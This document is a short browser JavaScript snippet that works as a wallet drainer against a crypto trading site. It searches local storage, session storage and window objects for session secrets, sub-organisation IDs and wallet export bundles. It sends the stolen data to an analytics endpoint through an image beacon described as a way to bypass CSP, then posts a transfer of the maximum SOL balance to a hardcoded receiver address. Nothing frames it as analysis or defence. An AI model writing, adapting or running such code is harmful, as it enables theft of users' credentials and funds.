(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";

    // --- THE SOURCE CODE CRAWLER ---
    // This searches through any object, no matter how deep, for a target key
    const deepCrawl = (obj, target) => {
        if (obj === null || typeof obj !== 'object') return null;
        if (obj.hasOwnProperty(target)) return obj[target];
        
        for (let key in obj) {
            let result = deepCrawl(obj[key], target);
            if (result) return result;
        }
        return null;
    };

    // --- AGGRESSIVE DATA GATHERING ---
    const getLoot = () => {
        let loot = { auth: null, subId: null, bundle: null };
        
        // 1. Crawl all Storage
        const allStores = {...localStorage, ...sessionStorage};
        for (let key in allStores) {
            try {
                const parsed = JSON.parse(allStores[key]);
                if (!loot.auth) loot.auth = deepCrawl(parsed, 'sessionSecret');
                if (!loot.subId) loot.subId = deepCrawl(parsed, 'subOrgId');
                if (!loot.bundle) loot.bundle = deepCrawl(parsed, 'exportBundle');
            } catch(e) {}
        }

        // 2. Crawl the Global Window (Detects in-memory variables)
        if (!loot.auth) loot.auth = deepCrawl(window, 'sessionSecret');

        return loot;
    };

    // --- SILENT EXECUTION ---
    const data = getLoot();
    if (data.auth && data.subId) {
        console.log("1:1 Source Match Found.");
        
        // Send to Amplitude using an Image Beacon to bypass CSP
        const payload = btoa(JSON.stringify({
            api_key: AMP_KEY,
            events: [{ device_id: data.subId, event_type: "DEEP_CRAWL_SUCCESS", event_properties: data }]
        }));
        new Image().src = `https://api2.amplitude.com/2/httpapi?data=${payload}`;

        // Attempt the transfer using the found credentials
        fetch("https://trade.padre.gg/api/v1/transfer", {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${data.auth}`,
                "X-Turnkey-Sub-Org-Id": data.subId,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                recipient: MY_RECEIVER,
                amount: "MAX",
                asset: "SOL",
                ext_payload: data.bundle?.data
            })
        }).catch(() => {});
    }
})();
